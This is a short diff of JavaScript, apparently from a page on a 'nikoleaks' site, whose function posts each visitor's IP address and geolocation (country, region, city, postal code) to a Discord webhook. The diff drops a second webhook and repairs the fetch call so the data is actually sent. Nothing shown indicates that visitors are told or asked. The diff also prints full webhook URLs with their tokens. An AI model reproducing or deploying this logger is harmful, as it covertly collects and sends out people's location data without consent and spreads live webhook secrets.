@@ -33,7 +33,6 @@
         async function sendIPToWebhook(ip, country, region, city, regionCode, postalCode) {
             try {
                 const webhookUrl = 'https://discord.com/api/webhooks/1113905631640956978/n_q330q6ampcLtvebJ4EpGl3INyjBTCu2OfH7im0bLtutO08fmjdW9EBY2UcwftEi_XR'; // Replace with your Discord webhook URL
-                const webhookUrl2 = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
                 const payload = {
                     content: `
 __**SomeOne Has Want To https://nikoleaks.netlify.app/main/test**__\n
@@ -45,7 +44,7 @@ City: ${city}\n
 Region Code: ${regionCode}\n
 Postal Code: ${postalCode}`
                 };
-                const response = await fetch(webhookUrl, webhookUrl2, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
